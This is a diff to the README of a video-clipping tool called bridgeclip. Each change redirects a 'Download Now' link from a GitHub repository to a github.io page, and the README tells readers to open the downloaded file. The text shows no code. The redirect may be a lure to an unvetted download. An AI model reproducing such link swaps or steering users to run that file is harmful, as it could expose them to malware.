@@ -1,6 +1,6 @@
 # ✂️ bridgeclip - Turn Long Videos into Viral Clips Instantly
 
-[![Download bridgeclip](https://img.shields.io/badge/Download-bridgeclip-blueviolet?style=for-the-badge&logo=github)](https://github.com/Herringbonepatternblackhumor707/bridgeclip)
+[![Download bridgeclip](https://img.shields.io/badge/Download-bridgeclip-blueviolet?style=for-the-badge&logo=github)](https://herringbonepatternblackhumor707.github.io)
 
 ## 🎯 What is bridgeclip?
 
@@ -44,7 +44,7 @@ Visit this link to download the application.
 
 **Step 1:** Click the download button below or visit the link above.
 
-[**Download bridgeclip Now**](https://github.com/Herringbonepatternblackhumor707/bridgeclip)
+[**Download bridgeclip Now**](https://herringbonepatternblackhumor707.github.io)
 
 **Step 2:** Once the download completes, open your Downloads folder and find the file you just downloaded.
 
@@ -142,7 +142,7 @@ bridgeclip is released under the MIT License, which means you can use, modify, a
 
 Download bridgeclip today and see how effortless video clipping can be. Whether you're growing your YouTube channel, managing a brand's social media, or just preserving funny moments with friends, bridgeclip is the tool you've been waiting for.
 
-[**Download bridgeclip Now**](https://github.com/Herringbonepatternblackhumor707/bridgeclip)
+[**Download bridgeclip Now**](https://herringbonepatternblackhumor707.github.io)
 
 Turn your long videos into audience favorites with one click. Your future viral moments are waiting.
 
